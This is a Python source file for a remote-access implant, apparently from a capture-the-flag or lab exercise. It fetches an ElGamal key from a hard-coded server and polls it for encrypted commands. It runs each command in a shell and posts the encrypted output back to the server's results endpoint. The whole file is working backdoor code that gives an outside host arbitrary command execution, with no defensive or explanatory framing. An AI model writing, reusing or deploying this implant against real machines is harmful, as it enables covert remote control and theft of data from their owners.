from encryption import ElGamal
from base64 import b64decode, b64encode
from Crypto.Util.number import long_to_bytes, bytes_to_long
from time import sleep
import requests
import subprocess
import json

IP = "192.168.1.6"
PORT = "5000"
HOST = f"http://{IP}:{PORT}"

el = ElGamal()


def getKey():
    data = requests.get(HOST + "/key").json()
    print("Fetched the key!")
    key = data["key"]
    key = b64decode(key)
    key = bytes_to_long(key)
    return key


def establishedSession():
    response = requests.get(HOST + "/tasks")
    if response.status_code == 200:
        encrypted_task = response.text
        task = decryptTask(encrypted_task)
        if task == "Session established":
            return True
    return False


def decryptTask(encrypted_task):
    task = el.decrypt(encrypted_task)
    task = task.decode().strip()
    return task


def encryptResult(result):
    task = el.encrypt(result)
    task = task.decode().strip()
    return task


def sendResult(result):
    result = {"result": result}
    requests.post(HOST + "/results", result)


def main():
    key = getKey()
    sleep(10)
    el.y = key

    if establishedSession():
        while True:
            sleep(3)

            response = requests.get(HOST + "/tasks")

            if response.status_code == 200:
                encrypted_task = response.text
                task = decryptTask(encrypted_task)
                try:
                    result = subprocess.check_output(task, shell=True)
                    result = result.decode()
                    if result != "":
                        result = "VALID " + result[:50]
                        result = bytes_to_long(result.encode())
                        result = el.encrypt(result)
                    sendResult(result)
                except:
                    sendResult("Error")


if __name__ == "__main__":
    main()
